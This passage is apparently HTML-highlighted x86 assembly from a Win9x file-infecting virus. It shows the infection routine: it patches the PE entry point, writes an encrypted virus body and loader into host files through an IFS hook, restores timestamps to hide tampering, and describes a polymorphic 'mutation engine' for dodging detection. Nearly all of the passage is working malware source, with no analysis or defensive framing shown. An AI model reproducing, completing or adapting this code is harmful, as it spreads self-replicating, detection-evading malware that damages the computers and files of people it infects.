        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edx.PhysicalSize</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; EAX holds our new EntryPoint RVA</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.NTOH_EntryPointRVA</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; EAX = New EP RVA - Old EP RVA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HostPtr</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; store difference between virus loader RVA and old EP RVA</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.NTOH_EntryPointRVA</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Set new EntryPoint RVA</span><span class="sc0">


    </span><span class="sc1">;/* Store offset where to write virus loader as we'll need it later.. */</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edx.PhysicalOffset</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edx.PhysicalSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; store offset to write virus loader on stack</span><span class="sc0">

    </span><span class="sc1">;/* Set new PhysicalSize for CODE section and update flags */</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.PhysicalSize</span><span class="sc4">],</span><span class="sc5">patchsize</span><span class="sc0">    </span><span class="sc1">; set CODE sections new size</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">edx.Flags</span><span class="sc4">],</span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">IMAGE_SCN_MEM_READ</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ecx.RVA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ecx.VirtualSize</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; EAX holds RVA of virus body</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.NTOH_EntryPointRVA</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; - Virus loader RVA = our DiffPtr (for exeption hook in loader)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DiffPtr</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc1">;/* Get offset where to write virus */</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ecx.PhysicalOffset</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ecx.VirtualSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; store offset to write virus body</span><span class="sc0">

    </span><span class="sc1">;/* increase last sections' PhysicalSize */</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ecx.VirtualSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.PhysicalSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; set new size for virus' section</span><span class="sc0">


    </span><span class="sc1">;/* Update VirtualSize in last section header, ImageSize and CodeSize in PE header */</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.VirtualSize</span><span class="sc4">],</span><span class="sc5">virus_aligned</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileBuffer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">eax.RVA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ecx.VirtualSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.NTOH_SizeOfImage</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.NTOH_SizeOfCode</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">@@jabba</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.NTOH_SizeOfCode</span><span class="sc4">],</span><span class="sc5">patchsize</span><span class="sc0">
</span><span class="sc5">@@jabba</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc1">;/* Set new flags for virus' section */</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">ecx.Flags</span><span class="sc4">],</span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">IMAGE_SCN_MEM_READ</span><span class="sc0">

    </span><span class="sc1">;/* write edited PE header */</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">800h</span><span class="sc0">            </span><span class="sc1">; EAX = size of buffer to write</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PE_RVA</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; ECX holds position of to where to write the data</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileBuffer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FSD</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">stack_fix_2</span><span class="sc0">

    </span><span class="sc1">;/* Generate new encryption keys, mutate virus decryptor, and encrypt</span><span class="sc0">
    </span><span class="sc1">;   virus main body in 2 layers. */</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MutateCryptors</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MutateHeader</span><span class="sc0">
        </span><span class="sc5">VxdCall</span><span class="sc0"> </span><span class="sc5">VMM_Get_System_Time</span><span class="sc0">     </span><span class="sc1">; returns the time, in milliseconds, since windoze started</span><span class="sc0">
        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; in case the counter is low, swap some values..</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; ....</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CryptKey</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; get previously stored key</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TopCryptKey</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">rcr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MainTopLayerKey</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MainTopLayerKey</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; xor millisecond counter with PE TimeDate stamp</span><span class="sc0">
        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; EBX holds our encryption key</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CryptKey</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc5">VxdCall</span><span class="sc0"> </span><span class="sc5">VMM_Get_System_Time</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">loops_ok</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">loops_ok</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PolyLoops</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ProcessKey</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">vstart</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CryptMirror</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc5">encrypted</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">vstart</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; ESI points to start of encrypted virus in mirror mem.</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">poly_encrypt</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SimpleCrypt</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc1">;/* Write encrypted code to file */</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; offset to write virus body</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CryptMirror</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FSD</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">stack_fix_1</span><span class="sc0">

    </span><span class="sc1">;/* write virus loader into CODE section */</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; offset to write virus loader</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">patchsize</span><span class="sc0">


</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">TOPCRYPT</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TopCryptEnc</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LoaderBuffer</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">loader</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FSD</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">nextifs</span><span class="sc0">

</span><span class="sc1">;_________________________________ (end of infection algorithm)</span><span class="sc0">

    </span><span class="sc1">;/* Restore original last modified time */</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fsd_filetime</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__forget_time</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddFileTime</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__forget_time</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">our_ioreq</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.ir_aux2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.ir_flags</span><span class="sc4">],</span><span class="sc5">SET_MODIFY_DATETIME</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">edi.ir_rh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.ir_rh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">edi.ir_fh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.ir_fh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">__forget_time</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">popad</span><span class="sc0">


    </span><span class="sc1">;/* Return to next IFS hook.. (some stackfixes) */</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">nextifs</span><span class="sc0">
</span><span class="sc5">stack_fix_2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">stack_fix_1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">nextifs</span><span class="sc0">
</span><span class="sc5">stack_fix_3</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc5">nextifs</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next_ifs_hook</span><span class="sc0">


</span><span class="sc1">;********************************************************</span><span class="sc0">
</span><span class="sc1">;*                          *</span><span class="sc0">
</span><span class="sc1">;* Our function for calling FSD. returns carry flag set *</span><span class="sc0">
</span><span class="sc1">;* if error                     *</span><span class="sc0">
</span><span class="sc1">;********************************************************</span><span class="sc0">

</span><span class="sc5">FSD</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">our_ioreq</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.ir_length</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">edi.ir_rh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.ir_rh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">edi.ir_fh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.ir_fh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.ir_pos</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.ir_data</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; read the file using direct FSD access</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">eax.ir_error</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">no_fsd_error</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
</span><span class="sc5">no_fsd_error</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">






</span><span class="sc9">comment</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc4">***</span><span class="sc0"> </span><span class="sc5">Sanatral</span><span class="sc0"> </span><span class="sc5">mutation</span><span class="sc0"> </span><span class="sc5">engine</span><span class="sc0"> </span><span class="sc4">***</span><span class="sc0">
#</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc5">change</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">dummy</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc3">"@dummy"</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0"> </span><span class="sc5">one</span><span class="sc0">
#</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc5">change</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc4">-</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">bytes</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc3">"@stackregz"</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc5">on</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0"> </span><span class="sc5">basis</span><span class="sc4">,</span><span class="sc0">
   </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">change</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">instructions</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc3">"@xchgfix"</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc3">"@addfix"</span><span class="sc0"> </span><span class="sc5">with</span><span class="sc0"> </span><span class="sc5">respective</span><span class="sc0"> </span><span class="sc5">register.</span><span class="sc0">
#</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc5">change</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">register</span><span class="sc0"> </span><span class="sc5">used</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc3">"@ifix1"</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">REG</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">-&gt;</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">REG</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">any</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">register</span><span class="sc4">-</span><span class="sc0">
   </span><span class="sc5">options</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> #</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">won</span><span class="sc13">'t affect delta)
</span><span class="sc0">#</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc5">change</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc5">bytes</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc3">"@ifix2"</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc3">"add esp,4"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc3">"pop eax,,nop,,nop"</span><span class="sc5">.</span><span class="sc0">
#</span><span class="sc2">5</span><span class="sc0"> </span><span class="sc5">change</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc5">bytes</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc3">"@ifix3"</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">either</span><span class="sc0"> </span><span class="sc3">"mov ebx,(dword-key) ,, nop"</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc13">"push (dword-key),,
</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc13">" (key offset will not be affected)
</span><span class="sc0">#</span><span class="sc2">6</span><span class="sc0"> </span><span class="sc5">change</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc5">bytes</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc3">"@ifix4"</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">either</span><span class="sc0"> </span><span class="sc3">"mov ecx,(TopCryptSize-3)"</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0">
   </span><span class="sc3">"push (TopCryptSize - 3),,pop ecx,,nop,,nop"</span><span class="sc0">
#</span><span class="sc2">7</span><span class="sc0"> </span><span class="sc5">change</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc3">"@ifix5"</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">either</span><span class="sc0"> </span><span class="sc3">"mov edi,esi"</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc3">"push esi,,pop edi"</span><span class="sc0">
#</span><span class="sc2">8</span><span class="sc0"> </span><span class="sc5">change</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc5">bytes</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc3">"@ifix6"</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc3">"mov eax,[esi],,add esi,4"</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc3">"losd,,nop,,nop,,nop,,nop"</span><span class="sc0">
#</span><span class="sc2">9</span><span class="sc0"> </span><span class="sc5">change</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc5">bytes</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc3">"@ifix7"</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">either</span><span class="sc0"> </span><span class="sc3">"sub esi,3"</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc3">"dec esi,,dec esi,,dec esi"</span><span class="sc0">
#</span><span class="sc2">10</span><span class="sc0"> </span><span class="sc5">change</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc3">"@ifix8"</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">either</span><span class="sc0"> </span><span class="sc3">"mov [edi],eax"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc3">"stosd,,nop"</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">won</span><span class="sc13">'t need to add to
</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc5">since</span><span class="sc0"> </span><span class="sc5">we</span><span class="sc0"> </span><span class="sc5">won</span><span class="sc13">'t use it)
